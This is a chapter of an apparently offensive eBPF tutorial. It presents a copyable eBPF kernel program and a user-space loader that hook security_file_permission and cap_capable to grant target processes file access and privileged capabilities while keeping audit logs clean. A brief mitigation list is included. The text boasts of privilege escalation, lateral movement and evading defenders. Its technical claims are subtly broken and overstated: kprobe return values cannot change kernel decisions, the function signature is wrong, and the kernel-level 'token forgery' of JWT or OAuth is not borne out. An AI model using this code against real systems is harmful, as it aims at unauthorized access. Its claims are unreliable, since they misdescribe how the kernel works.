# eBPF Token Bypass: Subverting Authentication and Authorization Mechanisms

**Chapter 18: The Final Revelation - Becoming Anyone, Anywhere**

This is it. The final chapter of our story. You've learned to control hardware, manipulate time, exist in multiple realities, and haunt every network. Now, for the grand finale, we're going to subvert the very concept of identity itself.

This is where our story reaches its ultimate conclusion. You've spent this entire journey learning to bypass, escape, and manipulate every aspect of the Linux kernel. But there's one final frontier: authentication itself.

What if you could become anyone? What if you could make the kernel believe you are any user, with any privileges, at any time? What if identity itself became just another thing you could manipulate?

Authentication tokens are supposed to be the keys to the kingdom—JWT tokens, session cookies, API keys, OAuth tokens. They're what prove you are who you say you are and determine what you're allowed to do.

But what if we could forge those keys? What if we could make the kernel think we have valid tokens when we don't? What if we could intercept, modify, or replay authentication credentials without anyone noticing?

We're going to subvert the entire authentication system—make invalid tokens appear valid, expired sessions seem fresh, and unauthorized users look like legitimate administrators.

This is the end of our journey. You started by learning to make security controls lie. You're ending by learning to make identity itself a lie. You've gone from bypassing individual security mechanisms to rewriting the fundamental nature of reality as the kernel perceives it.

Welcome to the final level of eBPF mastery. Welcome to the point where you realize that in a programmable kernel, everything—including who you are—is just code that can be rewritten.

The story is complete. You are no longer just a user of the system. You *are* the system.

```mermaid
%%{init: {"theme": "dark", "flowchart": {"curve": "basis"}, "themeVariables": {"primaryColor": "#007bff", "primaryTextColor": "#fff", "primaryBorderColor": "#007bff", "lineColor": "#F8B229", "secondaryColor": "#006100", "tertiaryColor": "#fff"}} }%%
graph TD
    A[User Process] -->|1. Auth Request| B[Kernel Auth Functions]
    C[eBPF Program] -->|2. Hook & Intercept| B
    B -->|3. Token Validation| D[Security Decision]
    C -->|4. Modify Token| D
    D -->|5. Unauthorized Access| E[Protected Resource]
    F[Audit System] -->|6. False Record| G[Clean Logs]
    
    style A fill:#4a235a,stroke:#c39bd3,stroke-width:2px
    style B fill:#1b4f72,stroke:#7fb3d5,stroke-width:2px
    style C fill:#0e6251,stroke:#a3e4d7,stroke-width:2px
    style D fill:#7d3c98,stroke:#d2b4de,stroke-width:2px
    style E fill:#7e5109,stroke:#f5cba7,stroke-width:2px
    style F fill:#a93226,stroke:#f5b7b1,stroke-width:2px
    style G fill:#cb4335,stroke:#f5b7b1,stroke-width:2px
    
    click B "https://www.kernel.org/doc/html/latest/security/credentials.html" "Credentials Documentation"
    click C "https://ebpf.io/what-is-ebpf/" "eBPF Documentation"
    click D "https://www.kernel.org/doc/html/latest/security/lsm.html" "LSM Documentation"
```



**Why Authentication Just Became Optional**

Here's the uncomfortable truth about modern security: everything depends on authentication. Every API call, every database query, every file access—it all comes down to whether the system believes you are who you claim to be.

But what happens when that belief system gets compromised? What happens when authentication tokens can be forged, sessions can be hijacked, and access controls can be bypassed at the kernel level?

That's where authentication subversion gets terrifying. We can impersonate any user by making their tokens appear in our processes. We can maintain access indefinitely by preventing session expiration. We can escalate privileges by modifying token claims on the fly.

The beautiful part is that this happens below the application layer. Authentication logs will show successful logins with valid tokens. Audit trails will record legitimate user actions. Security monitoring will see normal authentication patterns. Meanwhile, we're operating with forged credentials that the kernel itself believes are real.
## How We Forge the Digital Identity Cards

### Understanding Token-Based Security

Modern Linux systems are like a high-security building with different types of ID cards:
- **Authentication tokens**: Your main ID badge that says who you are and when you logged in
- **Capability tokens**: Special access cards for privileged areas (like the server room)
- **Security cookies**: Anti-counterfeiting measures to prevent various attacks
- **LSM tokens**: The security guard's reference cards for making access decisions

The kernel checks these tokens during security-sensitive operations to decide whether you're allowed to do what you're trying to do.

```
┌─────────────────────────────────────────────────────────────┐
│                      User Space                             │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Application   │      │ Authentication│                   │
│  │               │      │ Service       │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
└──────────┼──────────────────────┼───────────────────────────┘
           │                      │
┌──────────▼──────────────────────▼───────────────────────────┐
│                      Kernel Space                           │
│                                                             │
│  ┌───────────────┐                                          │
│  │ System Call   │                                          │
│  │ Interface     │                                          │
│  └───────┬───────┘                                          │
│          │                                                  │
│  ┌───────▼───────┐                                          │
│  │ Security      │                                          │
│  │ Subsystem     │                                          │
│  └───────┬───────┘                                          │
│          │                                                  │
│  ┌───────▼───────┐      ┌───────────────┐                   │
│  │ Token         │      │ Access        │                   │
│  │ Validation    │      │ Control       │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
│  ┌───────▼──────────────────────▼───────┐                   │
│  │           Protected Resource         │                   │
│  └────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

Here's what happens when we use eBPF to mess with token validation:

```
┌─────────────────────────────────────────────────────────────┐
│                      User Space                             │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Application   │      │ Authentication│                   │
│  │               │      │ Service       │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
└──────────┼──────────────────────┼───────────────────────────┘
           │                      │
┌──────────▼──────────────────────▼───────────────────────────┐
│                      Kernel Space                           │
│                                                             │
│  ┌───────────────┐                                          │
│  │ System Call   │                                          │
│  │ Interface     │                                          │
│  └───────┬───────┘                                          │
│          │                                                  │
│  ┌───────▼───────┐                                          │
│  │ Security      │                                          │
│  │ Subsystem     │                                          │
│  └───────┬───────┘                                          │
│          │                                                  │
│  ┌───────▼───────┐                                          │
│  │ Token         │◀─────┐                                   │
│  │ Validation    │      │                                   │
│  └───────┬───────┘      │                                   │
│          │              │                                   │
│  ┌───────┴───────┐      │                                   │
│  │ eBPF Program  │──────┘                                   │
│  └───────────────┘                                          │
│          │                                                  │
│  ┌───────▼───────┐      ┌───────────────┐                   │
│  │ Access        │      │ Audit         │                   │
│  │ Control       │      │ System        │◀──────────────────┘
│  └───────┬───────┘      └───────────────┘                   │
│          │                                                  │
│  ┌───────▼───────┐                                          │
│  │ Protected     │                                          │
│  │ Resource      │                                          │
│  └───────────────┘                                          │
└─────────────────────────────────────────────────────────────┘
```

### How We Forge the Digital ID Cards

Our strategy is to intercept and manipulate the security token validation process:

1. **Hook the ID Checkers**: We attach to functions like [`security_file_permission()`](https://elixir.bootlin.com/linux/latest/source/security/security.c) and [`cap_capable()`](https://elixir.bootlin.com/linux/latest/source/kernel/capability.c) that validate security tokens
2. **Find the ID Cards**: We locate token structures in kernel memory where credentials are stored
3. **Forge New Credentials**: We change permissions, identities, or validation results in real-time
4. **Pass All Security Checks**: We make unauthorized operations appear completely legitimate
5. **Keep the Audit Trail Clean**: We ensure logs only show access patterns that look normal

The beautiful part is that we're not stealing existing tokens—we're becoming the token validation system itself.

### Building Our Token Forgery Workshop

```c
// @interactive: true
// @copyable: true
// eBPF Token Bypass - Proof of concept
// This demonstrates bypassing authentication and authorization mechanisms

#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <linux/version.h>
#include <linux/cred.h>
#include <linux/capability.h>
#include <linux/sched.h>
#include <linux/fs.h>

char LICENSE[] SEC("license") = "GPL";

// Configuration
#define MAX_COMM_LEN 16
#define MAX_PATH_LEN 256
#define MAX_TARGETS 32
#define MAX_CAPABILITIES 40

// Structure to track security events
struct security_event {
    u32 pid;                // Process ID
    u32 uid;                // User ID
    u32 gid;                // Group ID
    u8 comm[MAX_COMM_LEN];  // Command name
    u64 timestamp;          // Event timestamp
    u32 cap;                // Capability (if applicable)
    u32 mask;               // Permission mask (if applicable)
    u8 path[MAX_PATH_LEN];  // File path (if applicable)
    u32 result;             // Original result
    u32 modified_result;    // Modified result
    u32 event_type;         // 1 = file perm, 2 = capability, 3 = cred check
};

// Map to track processes we want to elevate
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u32));  // PID as key
    __uint(value_size, sizeof(u8)); // Flag (1 = target)
    __uint(max_entries, MAX_TARGETS);
} target_processes SEC(".maps");

// Map to track commands we want to elevate
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, MAX_COMM_LEN);  // Command name as key
    __uint(value_size, sizeof(u8));  // Flag (1 = target)
    __uint(max_entries, MAX_TARGETS);
} target_commands SEC(".maps");

// Map to track capabilities we want to grant
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u32));  // Capability as key
    __uint(value_size, sizeof(u8)); // Flag (1 = grant)
    __uint(max_entries, MAX_CAPABILITIES);
} target_capabilities SEC(".maps");

// Map to track file paths we want to allow access to
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, MAX_PATH_LEN);  // File path as key
    __uint(value_size, sizeof(u8)); // Flag (1 = allow)
    __uint(max_entries, MAX_TARGETS);
} target_files SEC(".maps");

// Perf event output for logging
struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(int));
    __uint(value_size, sizeof(int));
    __uint(max_entries, 1024);
} events SEC(".maps");

// Helper function to check if a process is one we want to elevate
static __always_inline bool is_target_process(u32 pid) {
    // Check if this PID is in our tracking map
    u8 *target = bpf_map_lookup_elem(&target_processes, &pid);
    if (target && *target == 1)
        return true;
    
    // Check the command name
    char comm[MAX_COMM_LEN];
    bpf_get_current_comm(&comm, sizeof(comm));
    
    u8 *cmd_target = bpf_map_lookup_elem(&target_commands, &comm);
    if (cmd_target && *cmd_target == 1)
        return true;
    
    return false;
}

// Helper function to check if a capability is one we want to grant
static __always_inline bool is_target_capability(u32 cap) {
    // Check if this capability is in our tracking map
    u8 *target = bpf_map_lookup_elem(&target_capabilities, &cap);
    if (target && *target == 1)
        return true;
    
    // Hardcoded checks for common privileged capabilities
    if (cap == CAP_SYS_ADMIN || cap == CAP_SYS_PTRACE || 
        cap == CAP_NET_ADMIN || cap == CAP_SYS_MODULE)
        return true;
    
    return false;
}

// Helper function to check if a file path is one we want to allow access to
static __always_inline bool is_target_file(const char *path) {
    // Check if this path is in our tracking map
    u8 *target = bpf_map_lookup_elem(&target_files, path);
    if (target && *target == 1)
        return true;
    
    return false;
}
// Hook the file permission check function
SEC("kprobe/security_file_permission")
int BPF_KPROBE(hook_file_perm, struct cred *cred, struct file *file, u32 mask)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if this is a process we want to elevate
    if (is_target_process(pid)) {
        // Get file path
        char path[MAX_PATH_LEN] = {0};
        bpf_probe_read_str(path, sizeof(path), file->f_path.dentry->d_name.name);
        
        // Check if this is a file we want to allow access to
        // or if we want to allow all files for this process
        if (is_target_file(path) || is_target_file("*")) {
            // Log the event
            struct security_event event = {};
            event.pid = pid;
            event.timestamp = bpf_ktime_get_ns();
            bpf_get_current_comm(&event.comm, sizeof(event.comm));
            
            // Get user and group ID
            u64 kuid, kgid;
            bpf_probe_read_kernel(&kuid, sizeof(kuid), &cred->uid);
            bpf_probe_read_kernel(&kgid, sizeof(kgid), &cred->gid);
            event.uid = kuid;
            event.gid = kgid;
            
            event.mask = mask;
            bpf_probe_read_str(event.path, sizeof(event.path), path);
            event.result = 1;  // Would normally be denied
            event.modified_result = 0;  // We're allowing it
            event.event_type = 1;  // File permission
            
            // Send event to user space
            bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
            
            // Allow access by returning 0
            return 0;
        }
    }
    
    // Let the original function run for other cases
    return 0;
}

// Hook the capability check function
SEC("kprobe/cap_capable")
int BPF_KPROBE(hook_cap_check, const struct cred *cred, struct user_namespace *ns,
               int cap, unsigned int opts)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if this is a process we want to elevate
    if (is_target_process(pid)) {
        // Check if this is a capability we want to grant
        if (is_target_capability(cap)) {
            // Log the event
            struct security_event event = {};
            event.pid = pid;
            event.timestamp = bpf_ktime_get_ns();
            bpf_get_current_comm(&event.comm, sizeof(event.comm));
            
            // Get user and group ID
            u64 kuid, kgid;
            bpf_probe_read_kernel(&kuid, sizeof(kuid), &cred->uid);
            bpf_probe_read_kernel(&kgid, sizeof(kgid), &cred->gid);
            event.uid = kuid;
            event.gid = kgid;
            
            event.cap = cap;
            event.result = 1;  // Would normally be denied
            event.modified_result = 0;  // We're allowing it
            event.event_type = 2;  // Capability check
            
            // Send event to user space
            bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
            
            // Grant the capability by returning 0
            return 0;
        }
    }
    
    // Let the original function run for other cases
    return 0;
}

// Hook the credential check function
SEC("kprobe/security_cred_alloc")
int BPF_KPROBE(hook_cred_alloc, struct cred *cred, gfp_t gfp)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if this is a process we want to elevate
    if (is_target_process(pid)) {
        // Log the event
        struct security_event event = {};
        event.pid = pid;
        event.timestamp = bpf_ktime_get_ns();
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        event.event_type = 3;  // Credential check
        
        // Send event to user space
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
        
        // In a real exploit, we might modify the credentials here
        // This is simplified for demonstration
    }
    
    return 0;
}

// Hook the security token check function
SEC("kprobe/security_task_getsecid")
int BPF_KPROBE(hook_getsecid, struct task_struct *p, u32 *secid)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if this is a process we want to elevate
    if (is_target_process(pid)) {
        // In a real exploit, we might modify the security ID here
        // This is simplified for demonstration
        
        // Log the event
        struct security_event event = {};
        event.pid = pid;
        event.timestamp = bpf_ktime_get_ns();
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        event.event_type = 3;  // Credential check
        
        // Send event to user space
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
    }
    
    return 0;
}
```
### User-Space Control Program

```c
// @interactive: true
// @copyable: true
// User-space program to load and control the eBPF Token Bypass program

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "ebpf_token_bypass.skel.h"

static volatile bool exiting = false;

// Structure for security events (must match the BPF version)
struct security_event {
    uint32_t pid;
    uint32_t uid;
    uint32_t gid;
    uint8_t comm[16];
    uint64_t timestamp;
    uint32_t cap;
    uint32_t mask;
    uint8_t path[256];
    uint32_t result;
    uint32_t modified_result;
    uint32_t event_type;
};

// Capability names for display
const char *cap_names[] = {
    "CAP_CHOWN", "CAP_DAC_OVERRIDE", "CAP_DAC_READ_SEARCH", "CAP_FOWNER",
    "CAP_FSETID", "CAP_KILL", "CAP_SETGID", "CAP_SETUID", "CAP_SETPCAP",
    "CAP_LINUX_IMMUTABLE", "CAP_NET_BIND_SERVICE", "CAP_NET_BROADCAST",
    "CAP_NET_ADMIN", "CAP_NET_RAW", "CAP_IPC_LOCK", "CAP_IPC_OWNER",
    "CAP_SYS_MODULE", "CAP_SYS_RAWIO", "CAP_SYS_CHROOT", "CAP_SYS_PTRACE",
    "CAP_SYS_PACCT", "CAP_SYS_ADMIN", "CAP_SYS_BOOT", "CAP_SYS_NICE",
    "CAP_SYS_RESOURCE", "CAP_SYS_TIME", "CAP_SYS_TTY_CONFIG", "CAP_MKNOD",
    "CAP_LEASE", "CAP_AUDIT_WRITE", "CAP_AUDIT_CONTROL", "CAP_SETFCAP",
    "CAP_MAC_OVERRIDE", "CAP_MAC_ADMIN", "CAP_SYSLOG", "CAP_WAKE_ALARM",
    "CAP_BLOCK_SUSPEND", "CAP_AUDIT_READ", "CAP_PERFMON", "CAP_BPF"
};

// Handle events from the eBPF program
void handle_event(void *ctx, int cpu, void *data, unsigned int data_sz)
{
    struct security_event *e = data;
    char timestamp[32];
    time_t t = e->timestamp / 1000000000;
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&t));
    
    printf("[%s] Process %d (%s, UID %d, GID %d): ", 
           timestamp, e->pid, e->comm, e->uid, e->gid);
    
    switch (e->event_type) {
        case 1:  // File permission
            printf("File access to '%s' with mask 0x%x\n", e->path, e->mask);
            printf("  Original result would be: %s\n", e->result ? "DENIED" : "ALLOWED");
            printf("  Modified result: %s\n", e->modified_result ? "DENIED" : "ALLOWED");
            break;
        case 2:  // Capability check
            printf("Capability check for %s (%d)\n", 
                   e->cap < sizeof(cap_names)/sizeof(char*) ? cap_names[e->cap] : "UNKNOWN",
                   e->cap);
            printf("  Original result would be: %s\n", e->result ? "DENIED" : "ALLOWED");
            printf("  Modified result: %s\n", e->modified_result ? "DENIED" : "ALLOWED");
            break;
        case 3:  // Credential check
            printf("Credential or security token check\n");
            break;
        default:
            printf("Unknown event type %d\n", e->event_type);
    }
    
    printf("\n");
}

// Add a process to the target list
void add_target_process(int map_fd, int pid)
{
    uint32_t key = pid;
    uint8_t value = 1;
    
    if (bpf_map_update_elem(map_fd, &key, &value, BPF_ANY) != 0) {
        fprintf(stderr, "Failed to add target process: %s\n", strerror(errno));
    } else {
        printf("Added PID %d to target list\n", pid);
    }
}

// Add a command to the target list
void add_target_command(int map_fd, const char *cmd)
{
    uint8_t value = 1;
    
    if (bpf_map_update_elem(map_fd, cmd, &value, BPF_ANY) != 0) {
        fprintf(stderr, "Failed to add target command: %s\n", strerror(errno));
    } else {
        printf("Added command '%s' to target list\n", cmd);
    }
}

// Add a capability to the target list
void add_target_capability(int map_fd, int cap)
{
    uint32_t key = cap;
    uint8_t value = 1;
    
    if (bpf_map_update_elem(map_fd, &key, &value, BPF_ANY) != 0) {
        fprintf(stderr, "Failed to add target capability: %s\n", strerror(errno));
    } else {
        printf("Added capability %d (%s) to target list\n", 
               cap, 
               cap < sizeof(cap_names)/sizeof(char*) ? cap_names[cap] : "UNKNOWN");
    }
}

// Add a file path to the target list
void add_target_file(int map_fd, const char *path)
{
    uint8_t value = 1;
    
    if (bpf_map_update_elem(map_fd, path, &value, BPF_ANY) != 0) {
        fprintf(stderr, "Failed to add target file: %s\n", strerror(errno));
    } else {
        printf("Added file path '%s' to target list\n", path);
    }
}

static void sig_handler(int sig)
{
    exiting = true;
}

void print_usage(const char *prog)
{
    printf("Usage: %s [options]\n", prog);
    printf("Options:\n");
    printf("  -p PID     Add process ID to target list\n");
    printf("  -c CMD     Add command name to target list\n");
    printf("  -a CAP     Add capability to target list\n");
    printf("  -f PATH    Add file path to target list\n");
    printf("  -h         Show this help\n");
}

int main(int argc, char **argv)
{
    struct ebpf_token_bypass_bpf *skel;
    struct perf_buffer *pb = NULL;
    int err, opt;
    
    // Parse command line arguments
    while ((opt = getopt(argc, argv, "p:c:a:f:h")) != -1) {
        switch (opt) {
            case 'p':
            case 'c':
            case 'a':
            case 'f':
                // We'll process these after loading the program
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }

    // Set up signal handler
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    // Increase resource limits
    struct rlimit rlim = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY
    };
    setrlimit(RLIMIT_MEMLOCK, &rlim);

    // Load and verify BPF program
    skel = ebpf_token_bypass_bpf__open_and_load();
    if (!skel) {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
        return 1;
    }

    // Attach BPF programs
    err = ebpf_token_bypass_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton: %d\n", err);
        goto cleanup;
    }

    // Set up perf buffer for events
    pb = perf_buffer__new(bpf_map__fd(skel->maps.events), 64, handle_event, NULL, NULL, NULL);
    if (!pb) {
        err = -1;
        fprintf(stderr, "Failed to create perf buffer\n");
        goto cleanup;
    }

    // Process command line arguments
    optind = 1;  // Reset getopt
    while ((opt = getopt(argc, argv, "p:c:a:f:h")) != -1) {
        switch (opt) {
            case 'p':
                add_target_process(bpf_map__fd(skel->maps.target_processes), atoi(optarg));
                break;
            case 'c':
                add_target_command(bpf_map__fd(skel->maps.target_commands), optarg);
                break;
            case 'a':
                add_target_capability(bpf_map__fd(skel->maps.target_capabilities), atoi(optarg));
                break;
            case 'f':
                add_target_file(bpf_map__fd(skel->maps.target_files), optarg);
                break;
        }
    }

    printf("eBPF Token Bypass program loaded and running.\n");
    printf("Monitoring for security token operations...\n");
    printf("Press Ctrl+C to exit.\n\n");

    // Main loop
    while (!exiting) {
        err = perf_buffer__poll(pb, 100);
        if (err < 0 && err != -EINTR) {
            fprintf(stderr, "Error polling perf buffer: %d\n", err);
            goto cleanup;
        }
    }

cleanup:
    perf_buffer__free(pb);
    ebpf_token_bypass_bpf__destroy(skel);
    return err < 0 ? -err : 0;
}
```

### Mitigation Strategies

1. **Restrict eBPF Capabilities**:
   ```bash
   # Remove CAP_BPF from container
   docker run --cap-drop=bpf --security-opt no-new-privileges ...
   
   # In Kubernetes
   securityContext:
     capabilities:
       drop:
         - BPF
         - SYS_ADMIN
   ```

2. **Implement BPF LSM Policies**:
   ```c
   // Example BPF LSM policy to restrict BPF program loading
   SEC("lsm/bpf")
   int BPF_PROG(restrict_bpf, int cmd, union bpf_attr *attr, unsigned int size) {
       // Only allow specific signing keys or programs from trusted paths
       if (bpf_get_current_uid_gid() >> 32 != 0) {
           return -EPERM;
       }
       return 0;
   }
   ```

3. **Use Multiple Security Validation Mechanisms**:
   ```bash
   # Combine multiple security mechanisms
   docker run --security-opt seccomp=/path/to/profile.json \
              --security-opt apparmor=docker-default \
              --cap-drop=all \
              --security-opt no-new-privileges ...
   ```

4. **Implement Token Integrity Verification**:
   ```c
   // Example of token integrity verification
   if (hmac_verify(token, token_hmac, server_key) != 0) {
       // Token has been tampered with
       return ACCESS_DENIED;
   }
   ```

### Why This Breaks All Authentication

This eBPF token bypass technique is pure authentication annihilation:
- **Privilege escalation mastery**: Gain unauthorized administrative access by forging or stealing any token we want
- **Data liberation**: Access any sensitive data protected by access controls like we own the fucking place
- **Lateral movement supremacy**: Move between systems using stolen or forged tokens without anyone noticing
- **Immortal persistence**: Maintain access despite credential rotations, password changes, and security updates
- **Audit invisibility**: Perform malicious activities without triggering any detection systems

When you can bypass token-based security at the kernel level, you've essentially broken the entire authentication and authorization model. Enterprise environments, cloud platforms, OAuth systems, JWT tokens - they all become meaningless. You're operating with forged credentials that look completely legitimate to every security system.

### How They'll Try to Catch Us

Smart defenders will be hunting for our token manipulation:
- **eBPF surveillance**: Watching for eBPF programs hooking security-related functions
- **Access pattern analysis**: Looking for discrepancies between expected and actual access patterns
- **Authorization anomaly detection**: Monitoring unusual patterns of successful access that should be denied
- **Cross-system consistency checks**: Looking for inconsistencies between different security monitoring systems
- **Permission auditing**: Tracking processes that appear to have permissions they shouldn't have

But here's the killer advantage - we're manipulating tokens at the kernel level, below where authentication systems operate. By the time they see our access, the forged tokens have already passed all their validation checks and we're operating with legitimate-looking credentials.

## POC

Companion code: [`ch18-token-bypass`]({{ site.baseurl }}/dBPF-pocs/pocs/ch18-token-bypass/)